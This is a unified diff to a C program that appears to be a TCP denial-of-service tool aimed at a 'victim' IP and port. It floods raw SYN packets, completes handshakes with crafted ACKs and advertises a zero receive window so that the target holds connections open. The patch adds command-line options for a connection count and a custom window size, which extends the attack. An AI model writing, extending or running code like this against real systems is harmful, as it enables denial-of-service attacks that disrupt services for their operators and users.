@@ -90,13 +90,15 @@ struct tcp_header {
 };
 #pragma pack(pop)
 
-static const char *optString = "h?p:d:";
+static const char *optString = "h?p:d:c:w:";
 
 struct globalArgs_t {
     uint16_t attack_port;
     struct in_addr attack_ip;
     struct sockaddr_in iface_addr;
     int syn_delay;
+    int nconns;
+    int window;
     unsigned char payload[MAX_PAYLOAD_SIZE];
     size_t payload_size;
 } globalArgs;
@@ -163,6 +165,8 @@ void printUsage(char *msg)
     puts("\t<ip>\t\tVictim IP address");
     puts("\t<port>\t\tVictim port");
     puts("\t<interface>\tLocal network interface (e.g. eth0)");
+    puts("\t-c\t#Connections");
+    puts("\t-w\tWindow size for connection");
     puts("\t-p payload\tFile containing data to send after connecting");
     printf("\t\t\tPayload can be at most %d bytes\n", MAX_PAYLOAD_SIZE);
     printf("\t-d delay\tMicroseconds between SYN packets (default: %d)\n", DEFAULT_SYN_DELAY);
@@ -182,6 +186,8 @@ void initStats(void)
 
 void processArgs(int argc, char **argv)
 {
+    globalArgs.nconns = 0x7fffffff;
+    globalArgs.window = 0;
     globalArgs.attack_port = 0;
     globalArgs.syn_delay = DEFAULT_SYN_DELAY;
     globalArgs.payload_size = 0;
@@ -191,6 +197,9 @@ void processArgs(int argc, char **argv)
     {
         switch(opt)
         {
+            case 'c':
+                globalArgs.nconns = atoi(optarg);
+                break;
             case 'p':
                 loadPayload(optarg);
                 break;
@@ -198,6 +207,10 @@ void processArgs(int argc, char **argv)
                 globalArgs.syn_delay = atoi(optarg);
                 if(globalArgs.syn_delay == 0)
                     printUsage("Invalid delay.");
+                break;
+            case 'w':
+                globalArgs.window = atoi(optarg);
+		printf("Setting window size to %d\n", globalArgs.window);
                 break;
             case 'h':
             case '?':
@@ -311,6 +324,10 @@ void *send_syns(void *ptr)
             perror("[!] Error sending SYN packet");
         packetStats.syn_sent++;
         usleep(globalArgs.syn_delay); 
+	if (globalArgs.nconns > 0) {
+		if (--globalArgs.nconns <= 0)
+			break;
+	}
     }
 
 }
@@ -358,7 +375,7 @@ void send_ack(unsigned char *packet)
     // set ack flag
     ack->off_res_flags |= htons(0x0010);
 
-    ack->window = 0; // zero window to make the other side wait
+    ack->window = htons(globalArgs.window); // zero window to make the other side wait
     ack->urg_ptr = 0;
     ack->opts_pad = 0;
 
